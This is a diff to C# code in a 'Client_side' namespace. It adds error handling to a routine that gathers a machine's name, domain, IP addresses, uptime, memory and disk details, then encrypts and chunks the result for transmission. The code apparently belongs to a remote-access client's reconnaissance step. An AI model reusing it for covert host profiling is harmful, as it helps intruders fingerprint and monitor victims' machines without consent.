@@ -299,7 +299,6 @@ namespace Client_side
             string systemInfo = "";
 
             // Retrieve the system information using Registry
-
             // Computer Name
             string path = @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName";
             using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
@@ -341,7 +340,14 @@ namespace Client_side
             systemInfo += $"Domain Name: {Environment.UserDomainName}\n";
 
             // Public IP Address
-            systemInfo += $"Public IP Address: {new WebClient().DownloadString("https://ipinfo.io/ip")}\n";
+            try
+            {
+                systemInfo += $"Public IP Address: {new WebClient().DownloadString("https://ipinfo.io/ip")}\n";
+            }
+            catch (Exception)
+            {
+                systemInfo += "Public IP Address: Not Available\n";
+            }
 
             // Private IP Address
             string hostName = Dns.GetHostName();
@@ -355,14 +361,20 @@ namespace Client_side
             // System TimeZone
             systemInfo += $"System Time Zone: {TimeZoneInfo.Local.DisplayName}\n";
 
-            // System Uptime
-            ManagementObjectSearcher searcher = new("SELECT LastBootUpTime FROM Win32_OperatingSystem");
-            ManagementObjectCollection collection = searcher.Get();
-            foreach (ManagementObject obj in collection)
+            try
             {
-                DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(obj["LastBootUpTime"].ToString());
-                TimeSpan uptime = DateTime.Now.ToUniversalTime() - lastBootUpTime.ToUniversalTime();
-                systemInfo += $"System Uptime: {uptime.Days} days, {uptime.Hours} hours, {uptime.Minutes} minutes\n";
+                ManagementObjectSearcher searcher = new("SELECT LastBootUpTime FROM Win32_OperatingSystem");
+                ManagementObjectCollection collection = searcher.Get();
+                foreach (ManagementObject obj in collection)
+                {
+                    DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(obj["LastBootUpTime"].ToString());
+                    TimeSpan uptime = DateTime.Now.ToUniversalTime() - lastBootUpTime.ToUniversalTime();
+                    systemInfo += $"System Uptime: {uptime.Days} days, {uptime.Hours} hours, {uptime.Minutes} minutes\n";
+                }
+            }
+            catch (Exception ex)
+            {
+                systemInfo += $"System Uptime: Error retrieving system uptime\n";
             }
 
             // System Architecture
@@ -376,25 +388,39 @@ namespace Client_side
             }
 
             // System Memory
-            ManagementObjectSearcher searcher2 = new("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem");
-            ManagementObjectCollection collection2 = searcher2.Get();
-            foreach (ManagementObject obj in collection2)
+            try
             {
-                ulong totalMemory = (ulong)obj["TotalVisibleMemorySize"];
-                ulong freeMemory = (ulong)obj["FreePhysicalMemory"];
-                systemInfo += $"System Memory: {totalMemory / 1024} MB Total, {freeMemory / 1024} MB Free\n";
+                ManagementObjectSearcher searcher2 = new("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem");
+                ManagementObjectCollection collection2 = searcher2.Get();
+                foreach (ManagementObject obj in collection2)
+                {
+                    ulong totalMemory = (ulong)obj["TotalVisibleMemorySize"];
+                    ulong freeMemory = (ulong)obj["FreePhysicalMemory"];
+                    systemInfo += $"System Memory: {totalMemory / 1024} MB Total, {freeMemory / 1024} MB Free\n";
+                }
+            }
+            catch (Exception ex)
+            {
+                systemInfo += $"System Memory: Error retrieving system memory\n";
             }
 
             // System Disk Space
-            ManagementObjectSearcher searcher4 = new("SELECT FreeSpace, Size FROM Win32_LogicalDisk WHERE DeviceID = 'C:'");
-            ManagementObjectCollection collection4 = searcher4.Get();
-            foreach (ManagementObject obj in collection4)
+            try
             {
-                ulong freeSpace = (ulong)obj["FreeSpace"];
-                ulong totalSpace = (ulong)obj["Size"];
-                systemInfo += $"System Disk Space: {totalSpace / 1024 / 1024 / 1024} GB Total, {freeSpace / 1024 / 1024 / 1024} GB Free\n";
+                ManagementObjectSearcher searcher4 = new("SELECT FreeSpace, Size FROM Win32_LogicalDisk WHERE DeviceID = 'C:'");
+                ManagementObjectCollection collection4 = searcher4.Get();
+                foreach (ManagementObject obj in collection4)
+                {
+                    ulong freeSpace = (ulong)obj["FreeSpace"];
+                    ulong totalSpace = (ulong)obj["Size"];
+                    systemInfo += $"System Disk Space: {totalSpace / 1024 / 1024 / 1024} GB Total, {freeSpace / 1024 / 1024 / 1024} GB Free\n";
+                }
             }
-            
+            catch (Exception ex)
+            {
+                systemInfo += $"System Disk Space: Error retrieving system disk space\n";
+            }
+
             systemInfo = Encryptor.ConvertStr(Encoding.UTF8.GetBytes(systemInfo));
 
             for (int i = 0; i < systemInfo.Length; i += MaxChunkSize)
